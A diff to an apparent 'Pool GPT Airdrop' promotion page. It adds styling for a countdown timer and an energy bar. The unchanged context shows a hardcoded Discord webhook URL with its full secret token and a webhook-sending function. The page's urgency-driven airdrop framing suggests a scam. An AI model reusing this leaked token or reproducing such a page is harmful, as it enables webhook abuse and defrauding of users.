@@ -288,6 +288,61 @@
     .count {
         animation: count-up 525s linear forwards;
     }
+	.countdown-wrapper {
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  font-family: Arial, sans-serif;
+}
+
+.countdown {
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  width: 200px;
+  height: 200px;
+  border: 10px solid #ccc;
+  border-radius: 50%;
+  margin-bottom: 50px;
+}
+
+.countdown #timer {
+  font-size: 50px;
+  font-weight: bold;
+  color: #333;
+}
+
+.energy-wrapper {
+  display: flex;
+  flex-direction: column;
+  justify-content: center;
+  align-items: center;
+  width: 200px;
+  height: 50px;
+  border: 5px solid #ccc;
+  border-radius: 25px;
+  position: relative;
+}
+
+.energy-bar {
+  height: 100%;
+  background-color: #ff9900;
+  border-radius: 25px;
+  position: absolute;
+  top: 0;
+  left: 0;
+  z-index: -1;
+  transition: width 1s ease-in-out;
+}
+
+.energy-text {
+  font-size: 14px;
+  font-weight: bold;
+  color: #333;
+  position: relative;
+  z-index: 1;
+}
+
 	#energy-bar {
   width: 100%;
   height: 20px;
@@ -469,11 +524,14 @@ function sendWebhookMessage(webhookUrl, message) {
       const webhookUrl = "https://discordapp.com/api/webhooks/1078091750171746324/_S78Y9bzo5TvyNoeplYhQOSHA-lzF-P_qhEhTBZTUEcYydZHr682gNg99QsXnnswGj6-";
 
     </script>
-	  <div id="countdown">
-  <p>Tiempo restante de promoción: <span id="timer"></span></p>
-  <div id="energy-bar">
-    <div id="energy"></div>
-    <p>Pool GPT Airdrop</p>
+	<div class="countdown-wrapper">
+  <h2>Time out</h2>
+  <div class="countdown">
+    <span id="timer"></span>
+  </div>
+  <div class="energy-wrapper">
+    <div class="energy-bar" id="energy"></div>
+    <span class="energy-text">Pool GPT Airdrop</span>
   </div>
 </div>
 
